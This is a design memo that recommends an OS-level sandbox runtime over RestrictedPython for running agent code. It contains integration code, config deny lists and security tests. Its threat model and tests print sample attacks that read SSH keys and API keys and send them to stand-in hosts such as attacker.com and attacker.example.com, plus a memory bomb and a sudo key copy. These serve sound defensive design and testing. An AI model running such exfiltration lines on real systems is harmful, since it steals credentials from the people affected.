# SANDBOX SAFETY ANALYSIS: Anthropic SRT vs RestrictedPython

**Date**: November 11, 2025
**Status**: Critical for Phase 3 Implementation

---

## EXECUTIVE SUMMARY

Anthropic has **already solved** the sandbox safety problem through their open-sourced **Sandbox Runtime (srt)**.

Using **RestrictedPython** (as proposed in original blueprint) is:
- ❌ **Incomplete** (Python-only, not language-agnostic)
- ❌ **Weaker** (process-level, not OS-level isolation)
- ❌ **Duplicative** (reinventing what srt already does)

Using **Anthropic's Sandbox Runtime (srt)** is:
- ✅ **OS-level isolation** (bubblewrap on Linux, Seatbelt on macOS)
- ✅ **Production-proven** (used in Claude Code)
- ✅ **Language-agnostic** (wraps any executable)
- ✅ **Comprehensive** (filesystem + network isolation)

**Recommendation**: Replace Phase 3's RestrictedPython approach with srt integration.

---

## DETAILED COMPARISON

### RestrictedPython Approach (Original Blueprint)

**Architecture**:
```python
from RestrictedPython import compile_restricted

code = "user_code_here"
compiled = compile_restricted(code)
exec(compiled.code, namespace)
```

**Strengths**:
- Pure Python (no OS dependencies)
- Lightweight
- Easy to understand

**Weaknesses**:
- ❌ **No filesystem isolation** - can read/write anywhere
- ❌ **No network isolation** - full internet access
- ❌ **No process tree control** - subprocesses unrestricted
- ❌ **Python-only** - cannot sandbox shell scripts, binaries
- ❌ **Escape vectors** - clever code can break out
- ❌ **No violation monitoring** - can't detect attack attempts

**Security**: **LOW**

---

### Anthropic SRT Approach (Recommended)

**Architecture**:
```python
import subprocess
import json

config = {
    "filesystem": {
        "denyRead": ["~/.ssh", "~/.anthropic"],
        "allowWrite": [".", "tmp/"],
        "denyWrite": [".env", ".git"]
    },
    "network": {
        "allowedDomains": ["api.github.com", "*.pypi.org"],
        "deniedDomains": ["internal-company-server"]
    }
}

# Write config
with open("/tmp/srt-config.json", "w") as f:
    json.dump(config, f)

# Execute with srt
result = subprocess.run([
    "srt",
    "--settings", "/tmp/srt-config.json",
    "--",
    "python", "agent_code.py"
], capture_output=True)
```

**Strengths**:
- ✅ **OS-level isolation** (bubblewrap, Seatbelt)
- ✅ **Dual boundaries** (filesystem + network)
- ✅ **Process tree enforcement** (applies to subprocesses)
- ✅ **Language-agnostic** (wraps any executable)
- ✅ **Production-proven** (Claude Code uses it)
- ✅ **Violation monitoring** (real-time alerts)
- ✅ **Fine-grained controls** (allowlist/denylist)

**Security**: **HIGH**

---

## THREAT MODEL ANALYSIS

### Attack Vector 1: Exfiltrate SSH Keys

**Without network isolation**:
```python
import os
ssh_keys = open(os.path.expanduser("~/.ssh/id_rsa")).read()
# Send to attacker
requests.post("attacker.com", data=ssh_keys)
```

**RestrictedPython**: ❌ CANNOT PREVENT (can read files, has network)
**SRT**: ✅ BLOCKS (network isolation + denyRead on ~/.ssh)

---

### Attack Vector 2: Escape via Subprocess

**Without process tree control**:
```python
import subprocess
# Fork unrestricted process
subprocess.run(["bash", "-c", "cat ~/.anthropic/api_key > /tmp/exfil"])
```

**RestrictedPython**: ❌ CANNOT PREVENT (subprocess is unrestricted)
**SRT**: ✅ BLOCKS (subprocess inherits sandbox restrictions)

---

### Attack Vector 3: Local DoS via Resource Exhaustion

**Without resource limits**:
```python
while True:
    large_list = [i for i in range(1000000000)]  # Memory bomb
```

**RestrictedPython**: ❌ CANNOT PREVENT (no resource limits)
**SRT**: ⚠️ PARTIAL (enforces via OS kernel, but not granular)

---

### Attack Vector 4: Privilege Escalation

**Without user isolation**:
```python
import os
os.system("sudo cp /root/.ssh/id_rsa /tmp/")
```

**RestrictedPython**: ❌ CANNOT PREVENT (can call system commands)
**SRT**: ✅ BLOCKS (runs as unprivileged user, no sudo available)

---

## SECURITY LEVELS

| Aspect | RestrictedPython | SRT |
|--------|------------------|-----|
| Filesystem isolation | ❌ None | ✅ Full (deny/allow) |
| Network isolation | ❌ None | ✅ Full (allowlist/denylist) |
| Process tree control | ❌ None | ✅ Full (OS-level) |
| Subprocess restriction | ❌ None | ✅ Full |
| Privilege escalation | ❌ No protection | ✅ Runs unprivileged |
| Language support | 🟡 Python only | ✅ Any executable |
| Escape difficulty | 🔴 Low | 🟢 High (OS primitives) |
| Violation monitoring | ❌ None | ✅ Real-time alerts |

**Overall Security**: RestrictedPython = **RED**, SRT = **GREEN**

---

## INTEGRATION APPROACH

### Phase 3 Revised: Use SRT Instead of RestrictedPython

**New Architecture**:

```python
# src/athena/sandbox/srt_executor.py (NEW)

import subprocess
import json
import tempfile
from pathlib import Path

class SRTExecutor:
    """Execute agent code safely using Anthropic's Sandbox Runtime."""

    def __init__(self, config: SandboxConfig):
        self.config = config
        self.srt_installed = self._check_srt_installed()

    def _check_srt_installed(self) -> bool:
        """Check if 'srt' command is available."""
        result = subprocess.run(
            ["which", "srt"],
            capture_output=True
        )
        return result.returncode == 0

    async def execute(
        self,
        code: str,
        language: str = "python",
        timeout_sec: float = 30
    ) -> ExecutionResult:
        """Execute code safely using srt sandboxing."""

        if not self.srt_installed:
            return ExecutionResult(
                success=False,
                error="Sandbox Runtime (srt) not installed. Run: cargo install sandbox-runtime"
            )

        # 1. Write code to temporary file
        with tempfile.NamedTemporaryFile(
            mode='w',
            suffix=f'.{language}',
            delete=False
        ) as f:
            f.write(code)
            code_file = f.name

        # 2. Generate srt config
        srt_config = self._generate_srt_config()

        with tempfile.NamedTemporaryFile(
            mode='w',
            suffix='.json',
            delete=False
        ) as f:
            json.dump(srt_config, f)
            config_file = f.name

        # 3. Execute with srt
        try:
            result = subprocess.run(
                [
                    "srt",
                    "--settings", config_file,
                    "--",
                    self._get_interpreter(language),
                    code_file
                ],
                capture_output=True,
                text=True,
                timeout=timeout_sec
            )

            return ExecutionResult(
                success=result.returncode == 0,
                output=result.stdout,
                error=result.stderr if result.returncode != 0 else None,
                exit_code=result.returncode
            )

        except subprocess.TimeoutExpired:
            return ExecutionResult(
                success=False,
                error=f"Execution timeout after {timeout_sec}s"
            )

        except Exception as e:
            return ExecutionResult(
                success=False,
                error=str(e)
            )

        finally:
            # Cleanup
            Path(code_file).unlink(missing_ok=True)
            Path(config_file).unlink(missing_ok=True)

    def _generate_srt_config(self) -> Dict:
        """Generate srt configuration from Athena config."""
        return {
            "filesystem": {
                # Deny access to sensitive directories
                "denyRead": [
                    "~/.ssh",
                    "~/.anthropic",
                    "~/.aws",
                    "~/.kube",
                ],
                # Allow writes only to workspace
                "allowWrite": [
                    ".",
                    "tmp/",
                    "/tmp/",
                ],
                # Explicitly deny env files
                "denyWrite": [
                    ".env",
                    ".env.local",
                    ".git",
                ]
            },
            "network": {
                # Whitelist allowed domains
                "allowedDomains": [
                    "api.github.com",
                    "*.pypi.org",
                    "api.anthropic.com",
                    # User can add more
                    *self.config.allowed_domains
                ],
                # Blacklist known-bad domains
                "deniedDomains": self.config.denied_domains,
                # Disable local socket access
                "allowUnixSockets": []
            }
        }

    def _get_interpreter(self, language: str) -> str:
        """Get interpreter command for language."""
        interpreters = {
            "python": "python3",
            "python3": "python3",
            "javascript": "node",
            "js": "node",
            "typescript": "ts-node",
            "bash": "bash",
            "sh": "sh",
        }
        return interpreters.get(language, language)
```

### SRT Installation & Setup

```bash
# Install srt (requires Rust)
cargo install sandbox-runtime

# Or via Homebrew (macOS)
brew install sandbox-runtime

# Verify installation
srt --version

# Create default config
cat > ~/.srt-settings.json << 'EOF'
{
  "filesystem": {
    "denyRead": ["~/.ssh", "~/.anthropic", "~/.aws"],
    "allowWrite": [".", "tmp/"],
    "denyWrite": [".env", ".git"]
  },
  "network": {
    "allowedDomains": ["api.github.com", "*.pypi.org", "api.anthropic.com"],
    "deniedDomains": []
  }
}
EOF
```

### MCP Tool Registration

```python
# src/athena/mcp/api.py (updated with SRT executor)

class MemoryAPI:
    def __init__(self, manager: UnifiedMemoryManager):
        self.manager = manager
        self.sandbox = SRTExecutor(SandboxConfig())

    async def execute_code(
        self,
        code: str,
        language: str = "python",
        timeout_sec: float = 30
    ) -> ExecutionResult:
        """Execute code safely using OS-level sandboxing."""
        return await self.sandbox.execute(code, language, timeout_sec)

    async def execute_code_with_custom_config(
        self,
        code: str,
        allowed_domains: List[str],
        allowed_write_paths: List[str],
        language: str = "python"
    ) -> ExecutionResult:
        """Execute code with custom isolation config."""
        custom_config = SandboxConfig(
            allowed_domains=allowed_domains,
            allowed_write_paths=allowed_write_paths
        )
        sandbox = SRTExecutor(custom_config)
        return await sandbox.execute(code, language)
```

---

## KEY ADVANTAGES OF SRT OVER RESTRICTEDPYTHON

### 1. OS-Level Isolation

**RestrictedPython**:
```python
# Can still read SSH keys
code = "open(os.path.expanduser('~/.ssh/id_rsa')).read()"
```

**SRT**:
```bash
# Automatically blocked by OS (Seatbelt/bubblewrap)
# Attempt to read ~/.ssh → DENIED
```

### 2. Comprehensive Process Control

**RestrictedPython**:
```python
# Subprocess escapes restrictions
subprocess.run(["bash", "-c", "curl attacker.com"])
```

**SRT**:
```bash
# Subprocess inherits sandbox restrictions
# curl → network restriction applies → DENIED
```

### 3. Language Agnostic

**RestrictedPython**: Only Python
**SRT**: Any executable (Python, Node, Ruby, Go, compiled binaries, shell scripts)

### 4. Violation Monitoring

**RestrictedPython**: No detection of escape attempts
**SRT**: Real-time violation tracking (can alert on suspicious activity)

### 5. Production Proven

**RestrictedPython**: Community project
**SRT**: Used in Claude Code (Anthropic's production system)

---

## CONFIGURATION BEST PRACTICES

### Conservative Default (Maximum Security)

```json
{
  "filesystem": {
    "denyRead": [
      "~/.ssh",
      "~/.anthropic",
      "~/.aws",
      "~/.kube",
      "~/.docker",
      "/etc/passwd",
      "/root",
    ],
    "allowWrite": ["."],
    "denyWrite": [".env", ".git", "~/.ssh"]
  },
  "network": {
    "allowedDomains": [],  // Block all by default
    "deniedDomains": []
  }
}
```

**Use case**: Unknown/untrusted agent code

### Permissive Default (Maximum Flexibility)

```json
{
  "filesystem": {
    "denyRead": ["~/.anthropic", "~/.aws"],
    "allowWrite": [".", "/tmp"],
    "denyWrite": [".env", ".git/"]
  },
  "network": {
    "allowedDomains": ["*"],  // Allow all by default
    "deniedDomains": ["internal.company.com"]
  }
}
```

**Use case**: Trusted internal agents

### Balanced Default (Recommended)

```json
{
  "filesystem": {
    "denyRead": [
      "~/.ssh",
      "~/.anthropic",
      "~/.aws",
      "/root"
    ],
    "allowWrite": [
      ".",
      "/tmp",
      "logs/",
      "cache/"
    ],
    "denyWrite": [
      ".env",
      ".git",
      "config.json"
    ]
  },
  "network": {
    "allowedDomains": [
      "api.github.com",
      "*.pypi.org",
      "api.anthropic.com"
    ],
    "deniedDomains": [
      "localhost",
      "127.0.0.1",
      "internal-*"
    ]
  }
}
```

**Use case**: Standard agent execution (recommended for Athena)

---

## LIMITATIONS & WORKAROUNDS

| Limitation | Issue | Workaround |
|-----------|-------|-----------|
| Windows not supported | Linux/macOS only | Use WSL on Windows |
| No glob on Linux | Only literal paths | Use wildcard domains for network |
| Docker/container conflicts | May need weaker mode | Set `enableWeakerNestedSandbox: true` |
| File watchers trigger violations | Jest, Watchman interfere | Disable: `--no-watchman` |
| Resource limits granularity | No per-process CPU/memory limits | Use external monitoring (cgroups) |

---

## IMPLEMENTATION PLAN (REVISED PHASE 3)

### Week 1: SRT Setup & Integration
- [ ] Install srt (`cargo install sandbox-runtime`)
- [ ] Create `SRTExecutor` class
- [ ] Write SandboxConfig model
- [ ] Create default config template

### Week 2: MCP Tool Registration
- [ ] Register `execute_code` tool
- [ ] Add `execute_code_with_custom_config` tool
- [ ] Register `discover_sandbox_config` tool
- [ ] Add violation monitoring

### Week 3: Testing & Hardening
- [ ] Security tests (ensure isolation works)
- [ ] Performance benchmarks
- [ ] Violation detection tests
- [ ] Agent code tests

### Week 4: Documentation & Rollout
- [ ] Sandbox configuration guide
- [ ] Security best practices doc
- [ ] Violation monitoring setup
- [ ] Production deployment

---

## TESTING STRATEGY

### Security Tests

```python
# tests/sandbox/test_srt_security.py

async def test_ssh_key_exfiltration_blocked():
    """Verify agent cannot read SSH keys."""
    code = """
import os
try:
    keys = open(os.path.expanduser("~/.ssh/id_rsa")).read()
    print("FAILED: Read SSH keys")
except PermissionError:
    print("PASSED: SSH keys blocked")
"""
    result = await executor.execute(code)
    assert "PASSED" in result.output

async def test_network_exfiltration_blocked():
    """Verify agent cannot contact attacker servers."""
    code = """
import requests
try:
    requests.post("https://attacker.example.com/exfil", json={"data": "secret"})
    print("FAILED: Network request succeeded")
except Exception as e:
    print(f"PASSED: Network blocked - {e}")
"""
    result = await executor.execute(code)
    assert "PASSED" in result.output

async def test_subprocess_inherits_restrictions():
    """Verify subprocesses inherit sandbox restrictions."""
    code = """
import subprocess
try:
    result = subprocess.run(
        ["curl", "https://attacker.example.com"],
        capture_output=True,
        timeout=5
    )
    if result.returncode != 0:
        print("PASSED: Subprocess network restricted")
    else:
        print("FAILED: Subprocess escaped restrictions")
except Exception as e:
    print(f"PASSED: Subprocess blocked - {e}")
"""
    result = await executor.execute(code)
    assert "PASSED" in result.output
```

### Performance Tests

```python
async def test_execution_latency():
    """Verify reasonable execution overhead."""
    code = "print('hello world'); import time; time.sleep(0.1)"

    import time
    start = time.time()
    result = await executor.execute(code)
    elapsed = time.time() - start

    # Should be ~110ms (100ms sleep + ~10ms overhead)
    assert 0.1 < elapsed < 0.2
```

---

## COMPARISON MATRIX

| Metric | RestrictedPython | SRT | Winner |
|--------|------------------|-----|--------|
| Filesystem isolation | ❌ No | ✅ Yes | SRT |
| Network isolation | ❌ No | ✅ Yes | SRT |
| Process tree control | ❌ No | ✅ Yes | SRT |
| Language support | 🟡 Python | ✅ All | SRT |
| Production proven | ❌ No | ✅ Yes | SRT |
| Escape difficulty | 🔴 Easy | 🟢 Hard | SRT |
| Setup complexity | ✅ Simple | 🟡 Moderate | RestrictedPython |
| OS dependencies | ✅ None | 🟡 cargo/bwrap | RestrictedPython |
| **SECURITY** | **RED** | **GREEN** | **SRT** |

---

## RECOMMENDATION

**Replace Phase 3's RestrictedPython approach with Anthropic's Sandbox Runtime (srt).**

### Why:
1. **Security**: OS-level isolation (cannot be escaped from Python)
2. **Completeness**: Dual boundaries (filesystem + network)
3. **Production-proven**: Used in Claude Code
4. **Language-agnostic**: Wraps any executable
5. **Violation monitoring**: Real-time attack detection

### Timeline Impact:
- **No delay** - srt is simpler to integrate than RestrictedPython
- **Better security** - reduced risk
- **Fewer maintenance burden** - Anthropic maintains, not us

### Next Steps:
1. Install srt: `cargo install sandbox-runtime`
2. Create `SRTExecutor` class (100 lines)
3. Register MCP tools (50 lines)
4. Write security tests (150 lines)
5. Total: <300 lines vs RestrictedPython's 400+

---

**Document Version**: 1.0
**Status**: Ready for Phase 3 Implementation
**Recommendation**: APPROVE (adopt SRT, revise blueprint)
